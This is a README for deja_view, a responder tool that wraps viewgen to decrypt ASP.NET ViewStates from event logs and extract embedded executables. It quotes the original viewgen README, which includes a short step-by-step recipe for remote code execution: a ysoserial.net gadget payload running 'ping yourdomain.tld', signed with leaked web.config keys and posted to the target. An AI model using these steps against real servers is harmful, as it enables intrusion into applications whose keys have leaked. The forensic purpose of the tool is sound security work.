# deja_view
**Author:** Alyssa Rahman @ramen0x3f

**Last Updated:** 2022-03-30

## Description
Viewgen is a fantastic tool that lets you generate, decrypt, and decode ViewState payloads. 

I've created deja_view as a simple wrapper for viewgen, so analysts/responders can quickly decrypt and analyze ViewStates in bulk. 

### Inputs
deja_view requires at least one ViewState and valid machineKey values. There are a few options for how to provide these:

**ViewStates**
* Individually - you need the Persisted ViewState blob from event logs. This is going to be a Base64 encoded string. 
* Bulk - create a file with event log entries/lines that begin with “1316 | Information | Event code: 4009-++-Viewstate verification failed.” deja_view will auto-extract relevant details including the ViewState from each line that matches this pattern. 

**machineKey (uses viewgen functions)**
* Manual definition of keys, algorithms, and modifier
** Modifier is the ViewStateGenerator value. Try browsing the website and viewing source if you need to find this.
* Automated extraction from a web.config file

### Outputs
**Basic Stats**
* Number of ViewStates, successfully decrypted ViewStates, and extracted PEs

**TSV report**
* Decrypted ViewState
* MD5 hash of any extracted PEs from the ViewStates
* Additional metadata like client IP, user-agent, etc. if extracted from event log

**Extracted PEs**
* Filename is the MD5 hash listed in the TSV report

## Usage

### Setup
Requirements/install same as viewgen: 
```git clone https://github.com/ramen0x3f/viewgen.git
cd viewgen
pip3 install -r requirements.txt
```

### Decrypting ViewStates
Decrypting a single ViewState:
`python3 deja_view.py --modifier <viewstategenerator value> --vkey <validation key> --dkey <decryption key> --valg <validation algo> --dalg <decryption algo> -o <output filename for tsv results> --payload <encrypted viewstate>`

Decrypting all ViewStates in list of events:
`python3 deja_view.py --modifier <viewstategenerator value> --vkey <validation key> --dkey <decryption key> --valg <validation algo> --dalg <decryption algo> -o <output filename for tsv results> --logs <log file name>`
 
### Understanding Results
1. Analyze any extracted PEs
2. Review decrypted ViewStates to identify gadget chains/methods used for execution. 
** take the decrypted ViewState from the TSV (should start with /wE ) and Base64 decode it. 
** Ysoserial .NET includes several known abusable gadgets

# Archived viewgen README
I forked this repo to make some slight tweaks, so I could use viewgen from deja_view. The viewgen readme is included below. 

> # viewgen
> 
> ### ASP.NET ViewState Generator
> 
> **viewgen** is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or `web.config` files
> 
> ---------------
> 
> **Requirements**: Python 3
> 
> ### Installation
> 
> `pip3 install --upgrade -r requirements.txt` or `./install.sh`
> 
> 
> ---------------
> 
> ### Usage
> ```bash
> $ viewgen -h
> usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [-c COMMAND]
               > [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG]
               > [--dkey DKEY] [--dalg DALG] [-e]
               > [payload]
> 
> viewgen is a ViewState tool capable of generating both signed and encrypted
> payloads with leaked validation keys or web.config files
> 
> positional arguments:
  > payload               ViewState payload (base 64 encoded)
> 
> optional arguments:
  > -h, --help            show this help message and exit
  > --webconfig WEBCONFIG
                        > automatically load keys and algorithms from a
                        > web.config file
  > -m MODIFIER, --modifier MODIFIER
                        > VIEWSTATEGENERATOR value
  > -c COMMAND, --command COMMAND
                        > Command to execute
  > --decode              decode a ViewState payload
  > --guess               guess signature and encryption mode for a given
                        > payload
  > --check               check if modifier and keys are correct for a given
                        > payload
  > --vkey VKEY           validation key
  > --valg VALG           validation algorithm
  > --dkey DKEY           decryption key
  > --dalg DALG           decryption algorithm
  > -e, --encrypted       ViewState is encrypted
> ```
> 
> ---------------
> 
> ### Examples
> 
> ```bash
$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/> MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
> [+] ViewState
> (('1628925133', (None, [3, (['enctype', 'multipart/form-data'], None)])), None)
> [+] Signature
> 7441f6eeb4fab5a5f30d6ba99908c08eb683b9e6
> [+] Signature match
> 
> $ viewgen --webconfig web.config --modifier CA0B0334 "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk"
r4zCP5CdSo5R9XmiEXvp1LHVzX1uICmY7oW2WD/gKS/Mt/s+NKXrMpScr4Gvrji7lFdHPOttFpi2x7YbmQjEjJ2NdBMuzeKFzIuno2DenYF8yVVKx5+LL7LYmI0CVcNQ+jH8VxvzVG58NQIJ/> rSr6NqNMBahrVfAyVPgdL4Eke3Bq4XWk6BYW2Bht6ykSHF9szT8tG6KUKwf+T94hFUFNIXXkURptwQJEC/5AMkFXMU0VXDa
> 
> $ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
> [+] ViewState is not encrypted
> [+] Signature algorithm: SHA1
> 
> $ viewgen --guess "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
> [!] ViewState is encrypted
> [+] Algorithm candidates:
> AES SHA1
> DES/3DES SHA1
> ```
> 
> ---------------
> 
> ### Achieving Remote Code Execution
> 
> Leaking the `web.config` file or validation keys from ASP.NET apps results in RCE via ObjectStateFormatter deserialization if ViewStates are used.
> 
> You can use the built-in `command` option ([ysoserial.net](https://github.com/pwntester/ysoserial.net) based) to generate a payload:
> 
> ```bash
> $ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
> ```
> 
> However, you can also generate it manually:
> 
> **1 -** Generate a payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net):
> 
> ```bash
> > ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping yourdomain.tld"
> ```
> 
> **2 -** Grab a modifier (`__VIEWSTATEGENERATOR` value) from a given endpoint of the webapp
> 
> **3 -** Generate the signed/encrypted payload:
> 
> ```bash
> $ viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
> ```
> 
> **4 -** Send a POST request with the generated ViewState to the same endpoint
> 
> **5 -** Profit 🎉🎉
> 
> ---------------
> 
> **Thanks**
> 
> - [@orange_8361](https://twitter.com/orange_8361), the author of *Why so Serials* (HITCON CTF 2018)
> - [@infosec_au](https://twitter.com/infosec_au)
> - [@smiegles](https://twitter.com/smiegles)
> - **BBAC**
> 
> ---------------
> 
> **CTF Writeups**
> 
> - https://xz.aliyun.com/t/3019
> - https://cyku.tw/ctf-hitcon-2018-why-so-serials/
> 
> **Blog Posts**
> 
> - https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/
> 
> **Talks**
> 
> - https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf
> - https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints
> 
> ---------------
> 
> ### ⚠ Legal Disclaimer ⚠
> 
> This project is made for educational and ethical testing purposes only. Usage of this tool for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage caused by this tool.
